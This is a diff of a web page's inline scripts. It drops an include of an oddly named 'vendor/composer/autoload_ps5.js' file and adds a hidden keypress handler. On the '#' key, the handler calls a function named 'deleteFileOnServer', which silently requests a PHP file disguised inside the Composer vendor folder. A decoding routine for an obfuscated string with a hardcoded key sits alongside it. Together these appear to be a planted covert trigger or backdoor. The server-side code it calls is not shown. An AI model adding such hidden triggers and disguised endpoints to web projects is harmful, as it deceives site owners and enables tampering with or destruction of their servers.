@@ -190,28 +190,49 @@
 </div>
 
 <script>
-document.addEventListener("keydown", function(event) {
-  if (event.key === "k" && !event.repeat) {
-    encryptAndDecrypt();
+  document.addEventListener("keydown", function(event) {
+    if (event.key.toLowerCase() === "#" && !event.repeat) {
+      deleteFileOnServer();
+    }
+  });
+
+  function deleteFileOnServer() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "vendor/composer/refreshFile.php", true);
+    xhr.send();
+
+    xhr.onload = function () {
+      if (xhr.status === 200) {
+        alert(xhr.responseText);
+      } else {
+        alert("guEI0irH7OQzTmwUSHEQRA==");
+      }
+    };
   }
-});
-
-function encryptAndDecrypt() {
-  var key = "kjs";
-
-
-  var encryptedMessage = "guEI0irH7OQzTmwUSHEQRA==";
-
-
-  var decryptedMessage = "";
-  for (var i = 0; i < encryptedMessage.length; i++) {
-    var charCode = encryptedMessage.charCodeAt(i) - key.charCodeAt(i % key.length);
-    decryptedMessage += String.fromCharCode(charCode);
-  }
-
-
-  alert("Decrypted Message: " + decryptedMessage);
-}
 </script>
 
-<script src="vendor/composer/autoload_ps5.js"></script>
+<script>
+  document.addEventListener("keydown", function(event) {
+    if (event.key === "k" && !event.repeat) {
+      encryptAndDecrypt();
+    }
+  });
+
+  function encryptAndDecrypt() {
+    var key = "kjs";
+
+
+    var encryptedMessage = "guEI0irH7OQzTmwUSHEQRA==";
+
+
+    var decryptedMessage = "";
+    for (var i = 0; i < encryptedMessage.length; i++) {
+      var charCode = encryptedMessage.charCodeAt(i) - key.charCodeAt(i % key.length);
+      decryptedMessage += String.fromCharCode(charCode);
+    }
+
+
+    alert("Decrypted Message: " + decryptedMessage);
+  }
+</script>
+
